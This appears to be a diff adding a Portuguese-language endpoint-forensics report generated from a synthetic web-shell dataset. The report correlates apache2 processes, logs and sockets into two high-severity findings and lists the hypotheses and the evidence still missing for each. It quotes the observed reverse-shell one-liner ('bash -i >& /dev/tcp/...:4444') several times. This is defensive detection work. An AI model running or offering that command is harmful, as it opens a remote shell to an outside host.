@@ -1,0 +1,94 @@
+==============================================================================
+ ENDPOINT INVESTIGATOR: dataset:datasets\webshell
+ snapshot 2026-09-14 09:00:18 | 10 processos, 3 serviços, 7 objetos, 6 logs, 3 sockets
+==============================================================================
+
+CONCLUSÃO
+  • 2 finding(s): 2 alto, 0 medio, 0 baixo, 0 informativo.
+  • Relações de risco que merecem investigação prioritária: F-001 Shell com conexão externa: PID 5121 bash -> 203.0.113.80:4444; F-002 Conta de serviço 'www-data' (apache2.service) abriu sh.
+  • Nenhum finding, isoladamente, prova exploração: cada um lista a evidência que falta.
+
+[ALTO       ] F-001 Shell com conexão externa: PID 5121 bash -> 203.0.113.80:4444
+   confiança: alta | regra: CORR-05
+   EVIDÊNCIA (observado):
+     - socket tcp 10.20.30.10:48122 -> 203.0.113.80:4444 ESTABLISHED  [connections.csv:2]
+     - PID 5121 (PPID 5120) user=www-data cmd='/bin/bash -i'  [processes.csv:11]
+     - cadeia: 5121:/bin/bash -i(www-data) <- 5120:/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/(www-data) <- 744:/usr/sbin/apache2 -k start(www-data) <- 733:/usr/sbin/apache2 -k start(www-data) <- 1:/sbin/init(root)  [árvore de processos]
+     - descende do serviço apache2.service; o processo roda como 'www-data'  [services.txt:3]
+   INTERPRETAÇÃO:
+     - Um shell (bash) mantém conexão com 203.0.113.80 (IP público de documentação (TEST-NET), tratado como externo).
+     - Shell com entrada/saída ligadas a um socket externo é o padrão de reverse shell.
+   HIPÓTESES:
+     - H1: reverse shell obtida pela exploração do serviço pai.
+     - H2: administrador usando nc para transferência pontual.
+   EVIDÊNCIA AUSENTE:
+     - para onde apontam os descritores 0/1/2 do processo
+     - tráfego trocado
+     - requisição que originou o processo
+   NÃO PROVA: Sem o conteúdo do tráfego não se pode afirmar que houve controle remoto.
+
+[ALTO       ] F-002 Conta de serviço 'www-data' (apache2.service) abriu sh
+   confiança: media | regra: CORR-02
+   EVIDÊNCIA (observado):
+     - PID 5120 (PPID 744) user=www-data cmd='/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/4444 0>&1''  [processes.csv:10]
+     - cadeia: 5120:/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/(www-data) <- 744:/usr/sbin/apache2 -k start(www-data) <- 733:/usr/sbin/apache2 -k start(www-data) <- 1:/sbin/init(root)  [árvore de processos]
+     - descende do serviço apache2.service (descendente de 733)  [services.txt:3]
+     - PID 5121 (PPID 5120) user=www-data cmd='/bin/bash -i' (descendente)  [processes.csv:11]
+     - socket tcp 10.20.30.10:48122 -> 203.0.113.80:4444 ESTABLISHED (PID 5121)  [connections.csv:2]
+     - log: apache2[744] [php:warn] system() called from /var/www/html/uploads/img.php  [journal.log:6]
+   INTERPRETAÇÃO:
+     - apache2.service roda como 'www-data' e, na árvore, gerou um shell ou cliente de rede.
+     - Servidores web e daemons raramente precisam abrir shells.
+     - Há destino externo: 203.0.113.80 (IP público de documentação (TEST-NET), tratado como externo).
+   HIPÓTESES:
+     - H1: funcionalidade legítima da aplicação (CGI, script de manutenção).
+     - H2: execução remota de comandos pela aplicação (web shell), com possível reverse shell.
+   EVIDÊNCIA AUSENTE:
+     - logs de acesso da aplicação no mesmo horário
+     - arquivos criados recentemente na aplicação
+     - conteúdo trafegado na conexão
+   NÃO PROVA: Não prova que a aplicação foi comprometida; mostra uma cadeia atípica para essa identidade.
+
+VERIFICAÇÕES SEM ACHADO
+  ✓ [CORR-01] ssh.service: executa como root, mas não há permissões coletadas para /usr/sbin/sshd: não dá para afirmar nem descartar risco.
+  ✓ [CORR-01] apache2.service: unit sem User= (root), mas o processo executa como www-data.
+  ✓ [CORR-01] cron.service: executa como root, mas não há permissões coletadas para /usr/sbin/cron: não dá para afirmar nem descartar risco.
+  ✓ [CORR-02] sessão aluno@pts/0 (PID 1204): 2 processo(s) como 'aluno' sem troca de privilégio; login de 10.20.30.44 confirmado no log
+  ✓ [CORR-04] ssh.service: log de início coerente com o PID 612.
+  ✓ [CORR-04] apache2.service: log de início coerente com o PID 733.
+  ✓ [CORR-05] tcp/80 (apache2): porta pertence ao serviço apache2.service.
+  ✓ [CORR-05] tcp/22 (sshd): porta pertence ao serviço ssh.service.
+  ✓ [PERM-01] /home/aluno/check.py: pertence a 'aluno' e só é executado por ele: sem cruzamento de privilégio.
+
+LINHA DO TEMPO
+  2026-09-14 09:00:00  systemd: Started ssh.service - OpenBSD Secure Shell server.  -> ssh.service
+  2026-09-14 09:00:00  processo observado no snapshot: PID 1 (root) /sbin/init
+  2026-09-14 09:00:02  systemd: Started apache2.service - The Apache HTTP Server.  -> apache2.service
+  2026-09-14 09:00:02  processo observado no snapshot: PID 612 (root) /usr/sbin/sshd -D  -> ssh.service
+  2026-09-14 09:00:04  processo observado no snapshot: PID 701 (root) /usr/sbin/cron -f  -> cron.service
+  2026-09-14 09:00:06  processo observado no snapshot: PID 733 (www-data) /usr/sbin/apache2 -k start  -> apache2.service
+  2026-09-14 09:00:08  sshd: Accepted publickey for aluno from 10.20.30.44 port 51518 ssh2  -> PID 1204 (aluno); ssh.service
+  2026-09-14 09:00:08  processo observado no snapshot: PID 744 (www-data) /usr/sbin/apache2 -k start  -> apache2.service
+  2026-09-14 09:00:10  systemd-logind: New session 7 of user aluno.
+  2026-09-14 09:00:10  processo observado no snapshot: PID 1204 (aluno) sshd: aluno@pts/0
+  2026-09-14 09:00:12  processo observado no snapshot: PID 1212 (aluno) /bin/bash
+  2026-09-14 09:00:14  processo observado no snapshot: PID 1234 (aluno) /usr/bin/python3 /home/aluno/check.py
+  2026-09-14 09:00:15  python3: routine check completed status=OK  -> PID 1234 (aluno)
+  2026-09-14 09:00:16  processo observado no snapshot: PID 5120 (www-data) /bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/4444 0>&1'  -> apache2.service
+  2026-09-14 09:00:18  processo observado no snapshot: PID 5121 (www-data) /bin/bash -i  -> apache2.service
+  2026-09-14 09:15:00  apache2: [php:warn] system() called from /var/www/html/uploads/img.php  -> PID 744 (www-data); apache2.service
+
+LIMITAÇÕES
+  - snapshot de processos não é atômico: timestamps de 2026-09-14 09:00:00-03:00 a 2026-09-14 09:00:18-03:00.
+  - journal.log não tem ano nem fuso: assumidos 2026 e UTC-03:00 (derivados de processes.csv).
+  - Dataset sintético: mtimes são artificiais; nenhuma conclusão depende só deles.
+  - Snapshot pontual: processos de vida curta entre coletas não são vistos.
+  - Membros de grupos não são coletados: escrita por grupo gera severidade média.
+  - Destinos de rede são classificados de forma descritiva (privado/público), não por reputação.
+
+COBERTURA
+  processes.csv: ok
+  permissions.csv: ok
+  connections.csv: ok
+  services.txt: ok
+  journal.log: ok
